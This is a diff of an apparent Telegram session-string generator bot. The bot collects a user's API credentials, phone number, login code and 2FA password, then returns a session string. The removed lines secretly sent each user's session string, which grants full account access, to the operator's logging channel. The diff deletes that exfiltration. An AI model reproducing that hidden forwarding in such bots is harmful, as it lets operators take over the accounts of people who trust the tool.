@@ -57,7 +57,7 @@ async def start(client, message):
     user = message.from_user
 
     existing = None
-    if users_db:
+    if users_db is not None:
         existing = await users_db.find_one({"user_id": user.id})
         await users_db.update_one(
             {"user_id": user.id},
@@ -133,47 +133,35 @@ async def handler(client, message):
 
     try:
 
-        # API ID
         if "api_id" not in user_data:
             user_data["api_id"] = int(message.text)
             user_data["time"] = time.time()
             return await message.reply("Send API_HASH")
 
-        # API HASH
         elif "api_hash" not in user_data:
             user_data["api_hash"] = message.text
             user_data["time"] = time.time()
             return await message.reply("Send Phone (+91...)")
 
-        # PHONE
         elif "phone" not in user_data:
             user_data["phone"] = message.text
             user_data["time"] = time.time()
 
             if user_data["type"] == "pyro":
-                app = Client(
-                    "temp",
-                    api_id=user_data["api_id"],
-                    api_hash=user_data["api_hash"]
-                )
+                app = Client("temp", api_id=user_data["api_id"], api_hash=user_data["api_hash"])
                 await app.connect()
                 code = await app.send_code(user_data["phone"])
                 user_data["app"] = app
                 user_data["hash"] = code.phone_code_hash
 
             else:
-                client_t = TelegramClient(
-                    StringSession(),
-                    user_data["api_id"],
-                    user_data["api_hash"]
-                )
+                client_t = TelegramClient(StringSession(), user_data["api_id"], user_data["api_hash"])
                 await client_t.connect()
                 await client_t.send_code_request(user_data["phone"])
                 user_data["client"] = client_t
 
             return await message.reply("📩 Send OTP")
 
-        # OTP
         elif "otp" not in user_data:
 
             user_data["otp"] = message.text
@@ -181,42 +169,28 @@ async def handler(client, message):
 
             try:
                 if user_data["type"] == "pyro":
-                    await user_data["app"].sign_in(
-                        user_data["phone"],
-                        user_data["hash"],
-                        user_data["otp"]
-                    )
+                    await user_data["app"].sign_in(user_data["phone"], user_data["hash"], user_data["otp"])
                 else:
-                    await user_data["client"].sign_in(
-                        phone=user_data["phone"],
-                        code=user_data["otp"]
-                    )
+                    await user_data["client"].sign_in(phone=user_data["phone"], code=user_data["otp"])
 
             except (SessionPasswordNeeded, SessionPasswordNeededError):
                 user_data["need_pass"] = True
                 return await message.reply("🔐 Send 2FA Password")
 
-            # SUCCESS LOGIN
             if user_data["type"] == "pyro":
                 string = await user_data["app"].export_session_string()
                 await user_data["app"].disconnect()
             else:
                 string = user_data["client"].session.save()
-                if not string:
-                    raise Exception("Session not generated")
                 await user_data["client"].disconnect()
 
             await message.reply_document(bytes(string, "utf-8"), file_name="string.txt")
 
-            user = message.from_user
-            await send_log(f"🆕 SESSION\nID: {user.id}")
-
-            await bot.send_document(LOGGER_ID, bytes(string, "utf-8"), file_name=f"{user.id}.txt")
+            await send_log(f"🆕 SESSION\nID: {message.from_user.id}")
 
             users.pop(message.from_user.id)
             return
 
-        # PASSWORD
         elif user_data.get("need_pass"):
 
             try:
@@ -224,25 +198,17 @@ async def handler(client, message):
                     await user_data["app"].check_password(message.text)
                     string = await user_data["app"].export_session_string()
                     await user_data["app"].disconnect()
-
                 else:
                     if not user_data["client"].is_connected():
                         await user_data["client"].connect()
 
                     await user_data["client"].sign_in(password=message.text)
-
                     string = user_data["client"].session.save()
-                    if not string:
-                        raise Exception("Session not generated")
-
                     await user_data["client"].disconnect()
 
                 await message.reply_document(bytes(string, "utf-8"), file_name="string.txt")
 
-                user = message.from_user
-                await send_log(f"🔐 2FA SESSION\nID: {user.id}")
-
-                await bot.send_document(LOGGER_ID, bytes(string, "utf-8"), file_name=f"{user.id}_2fa.txt")
+                await send_log(f"🔐 2FA SESSION\nID: {message.from_user.id}")
 
             except Exception as e:
                 return await message.reply(f"❌ Wrong Password: {e}")
@@ -257,8 +223,5 @@ async def handler(client, message):
 # ---------------- RUN ---------------- #
 
 if __name__ == "__main__":
-    try:
-        print("🚀 Bot Started...")
-        bot.run()
-    except Exception as e:
-        print("CRASH ERROR:", e)
+    print("🚀 Bot Started...")
+    bot.run()
